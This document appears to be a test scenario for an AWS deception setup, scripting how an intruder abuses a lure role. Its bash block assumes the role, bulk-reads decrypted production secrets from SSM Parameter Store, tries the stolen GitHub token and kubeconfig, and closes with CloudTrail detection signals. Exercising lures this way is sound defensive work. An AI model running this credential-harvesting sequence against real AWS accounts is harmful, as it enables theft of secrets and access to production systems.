# Scenario 3 — Abuse Steps: SSM Parameter Store Infrastructure Credentials Lure

## Prerequisites
- AWS CLI configured with any IAM identity in the target account
- Account ID known

## Step-by-Step

```bash
# 1. Discover and assume the lure role
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)

CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/infra-config-readonly-role" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)

# 2. Enumerate all parameters — find /prod/* hierarchy
aws ssm describe-parameters --query "Parameters[*].[Name,Description,Type]" --output table

# 3. Bulk retrieve all /prod/* parameters in one call
aws ssm get-parameters-by-path \
  --path "/prod" \
  --recursive \
  --with-decryption \
  --query "Parameters[*].[Name,Value]" \
  --output table

# 4. Or read them individually for more detail

# Database master credentials
aws ssm get-parameter --name "/prod/database/master-credentials" --with-decryption --query "Parameter.Value" --output text | jq .

# GitHub deploy token
aws ssm get-parameter --name "/prod/ci-cd/github-deploy-token" --with-decryption --query "Parameter.Value" --output text | jq .

# Datadog API keys
aws ssm get-parameter --name "/prod/monitoring/datadog-api-keys" --with-decryption --query "Parameter.Value" --output text | jq .

# VPN admin credentials
aws ssm get-parameter --name "/prod/vpn/admin-credentials" --with-decryption --query "Parameter.Value" --output text | jq .

# EKS kubeconfig
aws ssm get-parameter --name "/prod/kubernetes/cluster-admin-kubeconfig" --with-decryption --query "Parameter.Value" --output text

# 5. Attempt to use extracted credentials (triggers detection)
# Example: try GitHub PAT
# curl -H "Authorization: token ghp_1a2B3c4D5e6F7g8H9i0JkLmNoPqRsTuVwX" https://api.github.com/user

# Example: save kubeconfig and try kubectl
# aws ssm get-parameter --name "/prod/kubernetes/cluster-admin-kubeconfig" --with-decryption --query "Parameter.Value" --output text > /tmp/kubeconfig
# KUBECONFIG=/tmp/kubeconfig kubectl get nodes

# 6. Clean up session
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

## Detection Signals
- CloudTrail: `AssumeRole` on `infra-config-readonly-role`
- CloudTrail: `DescribeParameters`
- CloudTrail: `GetParametersByPath` or individual `GetParameter` calls (5 events)
- Any attempted use of extracted credentials (GitHub, Datadog, VPN, EKS, DB)
